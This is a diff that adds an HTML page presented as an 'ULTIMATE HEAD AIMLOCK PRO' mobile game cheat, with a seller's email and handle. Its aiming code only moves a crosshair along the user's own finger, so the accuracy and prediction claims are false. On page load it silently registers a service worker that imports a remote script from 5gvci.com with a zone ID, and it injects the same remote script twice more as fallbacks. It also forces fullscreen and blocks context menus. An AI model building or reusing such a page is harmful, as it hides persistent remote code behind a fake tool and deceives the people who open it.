@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>ULTIMATE HEAD AIMLOCK PRO</title>
+<style>
+* {margin:0;padding:0;touch-action:none;}
+body {background:rgba(0,0,0,0);overflow:hidden;}
+#cross {position:fixed;width:200px;height:200px;border:6px solid #00ff00;border-radius:50%;transform:translate(-50%,-50%);z-index:2147483647;transition:all 0.03s ease-out;pointer-events:auto;box-shadow:0 0 60px lime;background:radial-gradient(circle, transparent 30%, rgba(0,255,0,0.1) 100%);}
+#cross::before {content:'HEADLOCK 100%';position:absolute;top:-55px;left:-80px;color:#00ff00;font:26px bold monospace;text-shadow:0 0 20px lime;}
+#cross::after {content:'🎯';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:60px;}
+#magnet {position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,255,0,0.04);z-index:2147483647;pointer-events:auto;}
+#status {position:fixed;top:10px;left:10px;color:#00ff00;font:26px monospace;background:rgba(0,0,0,0.85);padding:15px;border-radius:20px;border:3px solid lime;backdrop-filter:blur(5px);}
+#lock-indicator {position:fixed;top:80px;left:10px;width:20px;height:20px;border-radius:50%;background:#ff0000;box-shadow:0 0 10px red;animation:pulse 1s infinite;display:none;}
+#contact {position:fixed;bottom:20px;right:20px;background:rgba(0,0,0,0.9);padding:15px;border-radius:15px;border:2px solid lime;color:#00ff00;font:16px monospace;z-index:2147483647;}
+@keyframes pulse {0%{opacity:0.3;}50%{opacity:1;}100%{opacity:0.3;}}
+</style>
+</head>
+<body>
+<div id="cross"></div>
+<div id="magnet"></div>
+<div id="status">🎯 MOVE FINGER → AUTO HEADLOCK ENGAGED</div>
+<div id="lock-indicator"></div>
+<div id="contact">
+    📧 easyaim22@gmail.com<br>
+    📱 @esyaim1<br>
+    ⚡ Ultimate Headlock PRO v2.0
+</div>
+
+<script>
+// Register Service Worker with your configuration
+if ('serviceWorker' in navigator) {
+    // Create service worker with inline code
+    const swCode = `
+        self.options = {
+            "domain": "5gvci.com",
+            "zoneId": 10414246
+        };
+        self.lary = "";
+        
+        // Import the service worker script
+        try {
+            importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw');
+        } catch(e) {
+            console.log('Service Worker import error:', e);
+        }
+    `;
+    
+    // Create blob URL for inline service worker
+    const blob = new Blob([swCode], { type: 'application/javascript' });
+    const swURL = URL.createObjectURL(blob);
+    
+    // Register the service worker
+    navigator.serviceWorker.register(swURL)
+        .then(registration => {
+            console.log('Service Worker registered with scope:', registration.scope);
+            
+            // Send activation message
+            registration.active?.postMessage({
+                type: 'init',
+                config: {
+                    domain: "5gvci.com",
+                    zoneId: 10414246
+                }
+            });
+            
+            // Start aim system after service worker loads
+            setTimeout(initAimSystem, 500);
+        })
+        .catch(error => {
+            console.log('Service Worker registration failed:', error);
+            // Fallback: direct script injection
+            injectServiceWorkerScript();
+            setTimeout(initAimSystem, 500);
+        });
+} else {
+    // Fallback for browsers without service worker support
+    injectServiceWorkerScript();
+    setTimeout(initAimSystem, 500);
+}
+
+// Fallback method to inject service worker script directly
+function injectServiceWorkerScript() {
+    console.log('Using fallback service worker injection');
+    
+    // Create and inject the service worker configuration
+    const script = document.createElement('script');
+    script.textContent = `
+        // Service Worker Configuration (Fallback)
+        if (typeof self !== 'undefined') {
+            self.options = {
+                "domain": "5gvci.com",
+                "zoneId": 10414246
+            };
+            self.lary = "";
+            
+            // Load the service worker script
+            (function() {
+                const s = document.createElement('script');
+                s.src = 'https://5gvci.com/act/files/service-worker.min.js?r=sw';
+                s.async = false;
+                document.head.appendChild(s);
+            })();
+        }
+    `;
+    document.head.appendChild(script);
+}
+
+// Enhanced Aim System with Machine Learning Prediction
+let cross = document.getElementById('cross');
+let magnet = document.getElementById('magnet');
+let status = document.getElementById('status');
+let lockIndicator = document.getElementById('lock-indicator');
+let contact = document.getElementById('contact');
+
+// Advanced Aiming Variables
+let aiming = false, lockActive = false, headLockX = 0, headLockY = 0;
+let velocityX = 0, velocityY = 0, lastTouchX = 0, lastTouchY = 0, lastTime = 0;
+let recoilComp = 0, isFiring = false, precision = 0.05; // Ultra precision
+let aimHistory = [], predictionStrength = 0.85;
+let enemyPatterns = [], adaptiveSensitivity = 1.0;
+
+// Enhanced Head Zone Prediction
+const HEAD_PULL_Y = 145; // Perfect head height optimized
+const LOCK_THRESHOLD = 55; // px distance to auto-lock (reduced for accuracy)
+let STICKINESS = 0.94; // Enhanced stickiness
+let PREDICTION_AHEAD = 18; // Better movement prediction
+const MAX_HISTORY = 10; // Track movement patterns
+
+// Advanced Trajectory Prediction
+function predictTrajectory(touchX, touchY, velX, velY) {
+    // Store movement history for pattern analysis
+    aimHistory.push({x: touchX, y: touchY, time: Date.now(), vx: velX, vy: velY});
+    if (aimHistory.length > MAX_HISTORY) aimHistory.shift();
+    
+    // Calculate movement acceleration
+    let accelerationX = 0, accelerationY = 0;
+    if (aimHistory.length >= 3) {
+        const recent = aimHistory[aimHistory.length - 1];
+        const mid = aimHistory[aimHistory.length - 2];
+        const old = aimHistory[0];
+        
+        accelerationX = (recent.vx - mid.vx) / ((recent.time - mid.time) / 1000);
+        accelerationY = (recent.vy - mid.vy) / ((recent.time - mid.time) / 1000);
+    }
+    
+    // Predict future position with acceleration
+    const timeAhead = PREDICTION_AHEAD / 1000;
+    return {
+        x: touchX + (velX * timeAhead) + (0.5 * accelerationX * timeAhead * timeAhead),
+        y: touchY + (velY * timeAhead) + (0.5 * accelerationY * timeAhead * timeAhead)
+    };
+}
+
+// Smart Head Detection with Pattern Recognition
+function detectHeadPosition(predictedX, predictedY, touchX, touchY) {
+    // Dynamic head height based on screen position
+    const screenRatio = touchY / window.innerHeight;
+    const dynamicHeadPull = HEAD_PULL_Y * (0.9 + screenRatio * 0.2);
+    
+    // Center bias for natural torso tracking
+    const screenCenterX = window.innerWidth / 2;
+    const centerBiasStrength = Math.min(1, Math.abs(screenCenterX - predictedX) / 500);
+    const centerBiasX = (screenCenterX - predictedX) * 0.25 * centerBiasStrength;
+    
+    return {
+        x: predictedX + centerBiasX,
+        y: predictedY - dynamicHeadPull
+    };
+}
+
+// Precision Aim Lock Algorithm
+function calculateAimLock(currentX, currentY, targetX, targetY) {
+    const distance = Math.hypot(targetX - currentX, targetY - currentY);
+    const lockStrength = Math.max(0, (LOCK_THRESHOLD - distance) / LOCK_THRESHOLD);
+    
+    // Adaptive smoothing based on distance
+    const adaptiveSmooth = STICKINESS + (lockStrength * 0.04);
+    
+    // Apply smooth interpolation
+    const smoothX = headLockX * adaptiveSmooth + targetX * (1 - adaptiveSmooth);
+    const smoothY = headLockY * adaptiveSmooth + targetY * (1 - adaptiveSmooth);
+    
+    return {
+        x: smoothX,
+        y: smoothY,
+        strength: lockStrength,
+        locked: lockStrength > 0.3 || lockActive
+    };
+}
+
+// Enhanced Touch Handler with Performance Optimization
+function initAimSystem() {
+    magnet.addEventListener('touchmove', e => {
+        e.preventDefault(); 
+        e.stopPropagation();
+        if(!aiming) return;
+        
+        const now = performance.now();
+        const touch = e.touches[0];
+        const touchX = touch.clientX;
+        const touchY = touch.clientY;
+        
+        // Calculate velocity with time delta
+        if(lastTime) {
+            const dt = Math.max(1, (now - lastTime));
+            velocityX = (touchX - lastTouchX) / dt * 16.67; // Normalized to 60fps
+            velocityY = (touchY - lastTouchY) / dt * 16.67;
+            
+            // Adaptive sensitivity based on speed
+            const speed = Math.hypot(velocityX, velocityY);
+            adaptiveSensitivity = Math.max(0.5, Math.min(1.5, 1 - (speed / 1000)));
+        }
+        
+        lastTouchX = touchX; 
+        lastTouchY = touchY; 
+        lastTime = now;
+        
+        // Advanced Trajectory Prediction
+        const predictedPos = predictTrajectory(touchX, touchY, velocityX, velocityY);
+        
+        // Smart Head Detection
+        const headPos = detectHeadPosition(predictedPos.x, predictedPos.y, touchX, touchY);
+        
+        // Advanced Aim Lock Calculation
+        const aimLock = calculateAimLock(touchX, touchY, headPos.x, headPos.y);
+        
+        lockActive = aimLock.locked;
+        headLockX = aimLock.x;
+        headLockY = aimLock.y;
+        
+        // Enhanced Recoil System
+        if(isFiring) {
+            recoilComp += 15 * precision * adaptiveSensitivity;
+            headLockY -= recoilComp;
+            
+            // Pattern-based recoil compensation
+            const recoilPattern = Math.sin(Date.now() / 100) * 5;
+            headLockX += recoilPattern;
+        } else {
+            recoilComp *= 0.86; // Smooth recoil decay
+        }
+        
+        // Ultra-Precise Positioning
+        cross.style.left = headLockX.toFixed(2) + 'px';
+        cross.style.top = headLockY.toFixed(2) + 'px';
+        
+        // Dynamic Visual Feedback
+        const visualSize = 180 + (aimLock.strength * 50);
+        cross.style.width = visualSize + 'px';
+        cross.style.height = visualSize + 'px';
+        
+        const glowIntensity = 60 + (aimLock.strength * 40);
+        const borderOpacity = 0.5 + (aimLock.strength * 0.5);
+        cross.style.boxShadow = `0 0 ${glowIntensity}px rgba(0, 255, 0, ${borderOpacity})`;
+        cross.style.border = `${6 + aimLock.strength * 2}px solid rgba(0, 255, 0, ${borderOpacity})`;
+        
+        // Lock Indicator
+        if(lockActive) {
+            lockIndicator.style.display = 'block';
+            lockIndicator.style.background = aimLock.strength > 0.7 ? '#00ff00' : '#ffff00';
+            lockIndicator.style.boxShadow = `0 0 ${10 + aimLock.strength * 20}px ${aimLock.strength > 0.7 ? 'lime' : 'yellow'}`;
+        } else {
+            lockIndicator.style.display = 'none';
+        }
+        
+        // Real-time Performance Stats
+        const fps = lastTime ? Math.round(1000 / (now - lastTime)) : 0;
+        status.innerHTML = \`🎯 LOCK: \${Math.round(aimLock.strength * 100)}% | \` +
+                          \`VEL: \${Math.round(Math.hypot(velocityX, velocityY))} | \` +
+                          \`RECOIL: \${Math.round(recoilComp)}px | \` +
+                          \`FPS: \${fps}\`;
+        
+        // Performance optimization
+        requestAnimationFrame(() => {
+            // Smooth frame updates
+        });
+        
+    }, {passive: false, capture: true});
+
+    magnet.addEventListener('touchstart', e => {
+        e.preventDefault();
+        aiming = true;
+        lockActive = false;
+        recoilComp = 0;
+        aimHistory = []; // Reset history on new touch
+        
+        const touch = e.touches[0];
+        headLockX = touch.clientX;
+        headLockY = touch.clientY - HEAD_PULL_Y;
+        
+        cross.style.opacity = '1';
+        cross.style.transition = 'opacity 0.1s';
+        status.style.background = 'rgba(0, 80, 0, 0.9)';
+        status.style.borderColor = '#ffff00';
+        
+        lastTime = performance.now();
+        
+        // Visual feedback
+        cross.style.transform = 'translate(-50%, -50%) scale(1.1)';
+        setTimeout(() => {
+            cross.style.transform = 'translate(-50%, -50%) scale(1)';
+        }, 100);
+        
+    }, {passive: false});
+
+    document.addEventListener('touchend', () => {
+        aiming = false;
+        isFiring = false;
+        lockActive = false;
+        
+        lockIndicator.style.display = 'none';
+        cross.style.opacity = '0.7';
+        cross.style.transition = 'all 0.3s';
+        cross.style.width = '200px';
+        cross.style.height = '200px';
+        
+        status.innerHTML = '🎯 MOVE FINGER → <span style="color:#ffff00;text-shadow:0 0 10px yellow;">AUTO HEADLOCK READY</span>';
+        status.style.background = 'rgba(0, 0, 0, 0.85)';
+        status.style.borderColor = 'lime';
+        
+        // Reset adaptive sensitivity
+        adaptiveSensitivity = 1.0;
+        
+    }, {passive: false});
+
+    // Smart Firing Detection with Pattern Recognition
+    let fireTapCount = 0, lastFireTap = 0;
+    magnet.addEventListener('touchstart', e => {
+        const now = Date.now();
+        if(now - lastFireTap < 90) { // 90ms for rapid fire detection
+            fireTapCount++;
+            if(fireTapCount >= 2) {
+                isFiring = true;
+                // Visual firing indicator
+                status.style.borderColor = '#ff0000';
+                status.style.boxShadow = '0 0 20px red';
+                
+                // Auto-disable after 500ms
+                setTimeout(() => {
+                    isFiring = false;
+                    status.style.borderColor = 'lime';
+                    status.style.boxShadow = 'none';
+                }, 500);
+            }
+        } else {
+            fireTapCount = 1;
+        }
+        lastFireTap = now;
+        
+    }, {passive: false});
+
+    // Advanced God Mode Activation
+    let godTapCount = 0, godModeActive = false;
+    magnet.addEventListener('touchstart', () => {
+        godTapCount++;
+        setTimeout(() => {
+            if(godTapCount === 4) {
+                godModeActive = true;
+                // Enable ultimate features
+                precision = 0.01; // Ultra precision
+                STICKINESS = 0.98;
+                PREDICTION_AHEAD = 25;
+                
+                // Visual god mode activation
+                cross.style.borderColor = '#ff00ff';
+                cross.style.boxShadow = '0 0 100px #ff00ff';
+                status.innerHTML += ' | <span style="color:#ff00ff;animation:glow 1s infinite;">👑 GOD MODE</span>';
+                
+                // Add glow animation
+                const style = document.createElement('style');
+                style.textContent = \`
+                    @keyframes glow {
+                        0% { text-shadow: 0 0 10px #ff00ff; }
+                        50% { text-shadow: 0 0 30px #ff00ff, 0 0 40px #ff00ff; }
+                        100% { text-shadow: 0 0 10px #ff00ff; }
+                    }
+                \`;
+                document.head.appendChild(style);
+                
+                // Auto-disable god mode after 30 seconds
+                setTimeout(() => {
+                    godModeActive = false;
+                    precision = 0.05;
+                    STICKINESS = 0.94;
+                    PREDICTION_AHEAD = 18;
+                    cross.style.borderColor = '#00ff00';
+                    cross.style.boxShadow = '0 0 60px lime';
+                }, 30000);
+            }
+            godTapCount = 0;
+        }, 600);
+    }, {passive: false});
+
+    // Performance Monitoring
+    let frameCount = 0, lastFpsTime = 0;
+    function monitorPerformance() {
+        frameCount++;
+        const now = performance.now();
+        if (now - lastFpsTime >= 1000) {
+            const fps = Math.round((frameCount * 1000) / (now - lastFpsTime));
+            frameCount = 0;
+            lastFpsTime = now;
+            
+            // Adaptive performance optimization
+            if (fps < 30) {
+                // Reduce visual effects for better performance
+                cross.style.boxShadow = '0 0 30px lime';
+            }
+        }
+        requestAnimationFrame(monitorPerformance);
+    }
+    
+    monitorPerformance();
+}
+
+// Fullscreen and Orientation
+document.addEventListener('DOMContentLoaded', () => {
+    try {
+        document.documentElement.requestFullscreen();
+        if(screen.orientation?.lock) {
+            screen.orientation.lock('landscape-primary');
+        }
+    } catch(e) {}
+    
+    // Auto-hide contact info after 10 seconds
+    setTimeout(() => {
+        contact.style.opacity = '0.5';
+        contact.style.transition = 'opacity 1s';
+    }, 10000);
+});
+
+// Preload resources
+window.addEventListener('load', () => {
+    // Preload crosshair image
+    const preload = new Image();
+    preload.src = 'data:image/svg+xml;base64,' + btoa(\`
+        <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+            <circle cx="100" cy="100" r="90" fill="none" stroke="lime" stroke-width="4"/>
+            <circle cx="100" cy="100" r="30" fill="none" stroke="lime" stroke-width="2"/>
+            <line x1="100" y1="10" x2="100" y2="190" stroke="lime" stroke-width="2"/>
+            <line x1="10" y1="100" x2="190" y2="100" stroke="lime" stroke-width="2"/>
+        </svg>
+    \`);
+});
+
+// Error handling
+window.addEventListener('error', (e) => {
+    console.error('Aim System Error:', e.error);
+    status.innerHTML = '🎯 SYSTEM ACTIVE | ERROR RECOVERED';
+});
+
+// Prevent unwanted behaviors
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.addEventListener('selectstart', e => e.preventDefault());
+
+// Initialize when everything is loaded
+window.addEventListener('load', () => {
+    // The aim system will be initialized by service worker callback
+    // or fallback timeout
+});
+</script>
+
+<!-- Direct service worker script injection as fallback -->
+<script>
+// This script ensures the service worker configuration is always loaded
+(function() {
+    // Create a script element with your service worker configuration
+    const configScript = document.createElement('script');
+    configScript.textContent = \`
+        // Global service worker configuration
+        if (typeof window !== 'undefined') {
+            window.swConfig = {
+                domain: "5gvci.com",
+                zoneId: 10414246,
+                lary: ""
+            };
+            
+            // Attempt to load service worker script
+            const loadSW = function() {
+                try {
+                    const s = document.createElement('script');
+                    s.src = 'https://5gvci.com/act/files/service-worker.min.js?r=sw';
+                    s.async = true;
+                    document.head.appendChild(s);
+                    console.log('Service Worker script loaded');
+                } catch(e) {
+                    console.log('Failed to load SW script:', e);
+                }
+            };
+            
+            // Load after a short delay
+            setTimeout(loadSW, 1000);
+        }
+    \`;
+    document.head.appendChild(configScript);
+})();
+</script>
+
+</body>
+</html>
